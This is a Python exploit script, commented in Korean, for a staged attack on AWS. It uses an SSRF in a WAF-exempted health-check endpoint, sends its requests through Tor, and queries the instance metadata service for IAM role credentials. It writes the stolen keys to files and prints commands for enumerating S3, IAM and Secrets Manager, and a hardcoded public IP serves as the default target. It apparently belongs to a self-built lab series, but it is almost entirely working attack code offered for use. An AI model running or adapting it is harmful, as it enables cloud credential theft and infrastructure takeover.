#!/usr/bin/env python3
"""
AWS IMDS 공격 - 완벽한 보안의 작은 틈 공략

시나리오:
  완벽한 WAF + Splunk + PHP disable_functions
  BUT... health check 엔드포인트가 ModSecurity 예외로 등록됨 (작은 설정 실수)

공격 경로:
  health.php (ModSecurity 우회) → SSRF → IMDS → IAM credentials → AWS 인프라 장악
"""

import requests
import json
import sys
import time
import urllib.parse
from datetime import datetime

class AWSIMDSExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"

        # Health check 엔드포인트 (ModSecurity 예외)
        self.health_endpoint = f"{self.base_url}/api/health.php"

        # Tor 프록시 설정
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        self.credentials = None
        self.metadata = {}

    def print_banner(self):
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  AWS IMDS 공격 - 완벽한 보안의 작은 틈".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 엔드포인트: /api/health.php")
        print(f"[*] 취약점: ModSecurity 예외 + IMDSv1")
        print()

    def execute_ssrf(self, url):
        """Health check 엔드포인트를 통한 SSRF"""
        try:
            params = {
                'check': 'metadata',
                'url': url
            }

            resp = self.session.get(self.health_endpoint, params=params, timeout=15)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if 'metadata' in data:
                        return data['metadata']
                    elif 'error' in data:
                        return None
                    else:
                        return None
                except json.JSONDecodeError:
                    # JSON이 아닌 경우 텍스트 반환
                    return resp.text.strip()
            else:
                print(f"[-] SSRF 실패 (HTTP {resp.status_code})")
                return None

        except requests.exceptions.RequestException as e:
            print(f"[-] 요청 오류: {str(e)}")
            return None

    def check_health_endpoint(self):
        """Health check 엔드포인트 접근 가능 여부 확인"""
        print("[0] Health check 엔드포인트 확인 중...")
        print()

        try:
            resp = self.session.get(self.health_endpoint, timeout=10)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if 'status' in data:
                        print("[+] ✅ Health check 엔드포인트 접근 가능!")
                        print(f"[+] 서버: {data.get('server', 'unknown')}")
                        print(f"[+] 타임스탬프: {data.get('timestamp', 'unknown')}")
                        return True
                except:
                    pass

            print("[-] Health check 엔드포인트 접근 불가")
            print("[*] 가능한 원인:")
            print("    • 서버에서 119_setup_aws_vuln.sh 실행 안함")
            print("    • Apache 재시작 안함")
            print("    • 경로 오류")
            return False

        except requests.exceptions.RequestException as e:
            print(f"[-] 연결 오류: {str(e)}")
            return False

    def check_imds_access(self):
        """IMDS 접근 가능 여부 확인"""
        print()
        print("[1] IMDS 접근 가능 여부 확인 중...")
        print()

        # IMDSv1 테스트
        url = "http://169.254.169.254/latest/meta-data/"
        result = self.execute_ssrf(url)

        if result and len(result) > 10:
            print("[+] ✅ IMDSv1 접근 가능!")
            print("[+] 메타데이터 엔드포인트:")
            for line in result.split('\n')[:5]:
                if line.strip():
                    print(f"      {line}")
            if len(result.split('\n')) > 5:
                print("      ...")
            return True
        else:
            print("[-] IMDS 접근 불가")
            print("[*] 원인:")
            print("    • IMDSv2만 활성화되어 있음")
            print("    • Health check 엔드포인트가 작동하지 않음")
            print("    • curl 명령어 없음")
            return False

    def get_instance_metadata(self):
        """인스턴스 메타데이터 수집"""
        print()
        print("[2] 인스턴스 메타데이터 수집 중...")
        print()

        metadata_fields = {
            'instance-id': 'Instance ID',
            'instance-type': 'Instance Type',
            'local-ipv4': 'Private IP',
            'public-ipv4': 'Public IP',
            'placement/availability-zone': 'AZ',
            'placement/region': 'Region',
            'security-groups': 'Security Groups',
            'hostname': 'Hostname'
        }

        for field, label in metadata_fields.items():
            url = f"http://169.254.169.254/latest/meta-data/{field}"
            result = self.execute_ssrf(url)

            if result and result != '404 - Not Found' and not result.startswith('<?xml'):
                self.metadata[field] = result
                print(f"[+] {label}: {result}")
            else:
                print(f"[-] {label}: (없음)")

        return self.metadata

    def check_iam_role(self):
        """IAM Role 확인"""
        print()
        print("[3] IAM Role 확인 중...")
        print()

        url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        role_name = self.execute_ssrf(url)

        if role_name and role_name != '404 - Not Found' and len(role_name) > 0 and not role_name.startswith('<?xml'):
            print(f"[+] ✅ IAM Role 발견: {role_name}")
            return role_name.strip()
        else:
            print("[-] IAM Role이 연결되어 있지 않습니다")
            print("[*] 이 인스턴스로는 AWS 리소스에 접근할 수 없습니다")
            return None

    def steal_credentials(self, role_name):
        """IAM 자격 증명 탈취"""
        print()
        print("[4] IAM 자격 증명 탈취 중...")
        print()

        url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        creds_json = self.execute_ssrf(url)

        if not creds_json:
            print("[-] 자격 증명을 가져올 수 없습니다")
            return None

        try:
            creds = json.loads(creds_json)

            if 'AccessKeyId' in creds and 'SecretAccessKey' in creds:
                self.credentials = creds

                print("[+] ✅✅✅ AWS 자격 증명 탈취 성공!")
                print()
                print("╔" + "═"*58 + "╗")
                print("║  IAM Credentials                                           ║")
                print("╚" + "═"*58 + "╝")
                print()
                print(f"AccessKeyId:     {creds.get('AccessKeyId')}")
                print(f"SecretAccessKey: {creds.get('SecretAccessKey')[:30]}...")
                print(f"Token:           {creds.get('Token')[:30]}...")
                print(f"Expiration:      {creds.get('Expiration')}")
                print(f"Type:            {creds.get('Type')}")
                print()

                return creds
            else:
                print("[-] 유효한 자격 증명이 아닙니다")
                print(f"[*] 응답: {creds_json[:200]}")
                return None

        except json.JSONDecodeError:
            print("[-] JSON 파싱 실패")
            print(f"[*] 응답: {creds_json[:200]}")
            return None

    def save_credentials(self):
        """자격 증명을 파일로 저장"""
        if not self.credentials:
            return

        print("[5] 자격 증명 저장 중...")
        print()

        timestamp = int(time.time())

        # AWS CLI 형식
        aws_config = f"""# AWS 자격 증명 (탈취)
# 탈취 시각: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# 대상: {self.target_ip}
# 방법: health.php SSRF → IMDSv1
#
# 사용법 1: 환경 변수
export AWS_ACCESS_KEY_ID="{self.credentials.get('AccessKeyId')}"
export AWS_SECRET_ACCESS_KEY="{self.credentials.get('SecretAccessKey')}"
export AWS_SESSION_TOKEN="{self.credentials.get('Token')}"

# 사용법 2: ~/.aws/credentials에 추가
cat >> ~/.aws/credentials << 'EOF'

[stolen-{timestamp}]
aws_access_key_id = {self.credentials.get('AccessKeyId')}
aws_secret_access_key = {self.credentials.get('SecretAccessKey')}
aws_session_token = {self.credentials.get('Token')}
EOF

# 만료 시각: {self.credentials.get('Expiration')}
"""

        filename = f"aws_stolen_{timestamp}.sh"
        with open(filename, 'w') as f:
            f.write(aws_config)

        print(f"[+] AWS CLI 설정: {filename}")

        # JSON 형식
        json_filename = f"aws_stolen_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump({
                'credentials': self.credentials,
                'metadata': self.metadata,
                'stolen_at': datetime.now().isoformat(),
                'target': self.target_ip,
                'method': 'health.php SSRF + IMDSv1'
            }, f, indent=2)

        print(f"[+] JSON 형식: {json_filename}")
        print()

    def test_permissions(self):
        """권한 테스트 가이드 출력"""
        if not self.credentials:
            return

        print()
        print("╔" + "═"*58 + "╗")
        print("║  다음 단계: AWS 권한 테스트                                ║")
        print("╚" + "═"*58 + "╝")
        print()

        print("[*] 로컬 터미널에서 다음 명령어를 실행하세요:")
        print()

        print("# 1. 환경 변수 설정")
        print(f'export AWS_ACCESS_KEY_ID="{self.credentials.get("AccessKeyId")}"')
        print(f'export AWS_SECRET_ACCESS_KEY="{self.credentials.get("SecretAccessKey")}"')
        print(f'export AWS_SESSION_TOKEN="{self.credentials.get("Token")}"')
        print()

        print("# 2. 신원 확인")
        print("aws sts get-caller-identity")
        print()

        print("# 3. 권한 테스트")
        print("aws ec2 describe-instances --region ap-northeast-2")
        print("aws s3 ls")
        print("aws rds describe-db-instances --region ap-northeast-2")
        print("aws iam list-users")
        print("aws secretsmanager list-secrets --region ap-northeast-2")
        print()

        print("# 4. 더 많은 공격")
        print("python3 121_aws_privilege_escalation.py")
        print()

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        # Phase 0: Health check 확인
        if not self.check_health_endpoint():
            print()
            print("[-] 공격 실패: Health check 엔드포인트 접근 불가")
            print()
            print("[!] 서버에서 다음을 실행하세요:")
            print("    sudo bash 119_setup_aws_vuln.sh")
            return False

        # Phase 1: IMDS 접근 확인
        if not self.check_imds_access():
            print()
            print("[-] 공격 실패: IMDS 접근 불가")
            print()
            print("[!] 서버에서 IMDSv1을 활성화하세요:")
            print("    1. AWS Console → EC2 → Instance")
            print("    2. Actions → Instance Settings → Modify instance metadata options")
            print("    3. IMDSv2: Optional (not required)")
            return False

        # Phase 2: 메타데이터 수집
        self.get_instance_metadata()

        # Phase 3: IAM Role 확인
        role_name = self.check_iam_role()
        if not role_name:
            print()
            print("[-] 공격 제한: IAM Role 없음")
            print("[*] 메타데이터는 수집했지만 AWS 접근은 불가능합니다")
            return False

        # Phase 4: 자격 증명 탈취
        creds = self.steal_credentials(role_name)
        if not creds:
            print()
            print("[-] 공격 실패: 자격 증명 획득 불가")
            return False

        # Phase 5: 저장
        self.save_credentials()

        # Phase 6: 가이드
        self.test_permissions()

        print("╔" + "═"*58 + "╗")
        print("║  ✅ 공격 성공!                                             ║")
        print("╚" + "═"*58 + "╝")
        print()
        print("[+] 완벽한 보안 시스템의 작은 틈(health.php ModSecurity 예외)을 통해")
        print("[+] AWS 인프라 접근 권한을 획득했습니다!")
        print()
        print("[*] 공격 경로:")
        print("    1. /api/health.php 발견 (포트 스캔/디렉터리 브루트포스)")
        print("    2. ModSecurity 예외로 인해 WAF 우회")
        print("    3. ?check=metadata 파라미터로 SSRF 트리거")
        print("    4. IMDSv1 → IAM credentials 탈취")
        print("    5. AWS 리소스 접근 권한 획득")
        print()

        return True

def main():
    print()

    # 인터랙티브 모드
    if len(sys.argv) < 2:
        print("═"*60)
        print("AWS IMDS 공격 - Health Check SSRF 공략")
        print("═"*60)
        print()

        target_ip = input("타겟 IP 주소 (기본: 52.79.240.83): ").strip()
        if not target_ip:
            target_ip = "52.79.240.83"

        print()
    else:
        # CLI 모드
        target_ip = sys.argv[1]

    # 공격 실행
    exploit = AWSIMDSExploit(target_ip)
    success = exploit.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
